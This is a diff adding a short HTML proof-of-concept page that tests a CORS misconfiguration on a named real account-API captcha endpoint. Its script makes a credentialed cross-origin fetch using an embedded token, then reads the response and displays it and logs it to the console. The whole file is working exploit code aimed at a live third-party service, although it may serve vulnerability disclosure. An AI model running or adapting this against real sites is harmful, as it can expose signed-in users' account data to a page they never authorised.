@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>CORS Authenticated PoC</title></head>
+<body>
+  <h3>CORS Authenticated PoC — open DevTools (Console & Network)</h3>
+  <p id="status">Running fetch...</p>
+  <pre id="out">waiting...</pre>
+<script>
+const ENDPOINT = "https://account-api.proton.me/captcha/v1/api/init?challengeType=2D&parentURL=https%3A%2F%2Faccount-api.proton.me%2Fcore%2Fv4%2Fcaptcha%3FToken%3DisnOE4ku0FzUCLNaOOLL-jbs%26ForceWebMessaging%3D1&displayedLang=en&supportedLangs=en-US%2Cen-US%2Cen%2Cen-US%2Cen&purpose=signup&token=isnOE4ku0FzUCLNaOOLL-jbs";
+fetch(ENDPOINT, { method:'GET', mode:'cors', credentials:'include' })
+  .then(async r => {
+    document.getElementById('status').innerText = 'Status: ' + r.status;
+    try {
+      const ct = r.headers.get('Content-Type') || '';
+      if (ct.includes('json')) {
+        const j = await r.json();
+        document.getElementById('out').innerText = JSON.stringify(j, null, 2);
+        console.log('PoC JSON', j);
+      } else {
+        const t = await r.text();
+        document.getElementById('out').innerText = t.slice(0,2000);
+        console.log('PoC text', t);
+      }
+    } catch(e) {
+      document.getElementById('out').innerText = 'Parse error: ' + e;
+    }
+  }).catch(e => {
+    document.getElementById('status').innerText = 'Fetch failed: ' + e;
+    document.getElementById('out').innerText = 'fetch error: ' + e;
+  });
+</script>
+</body>
+</html>
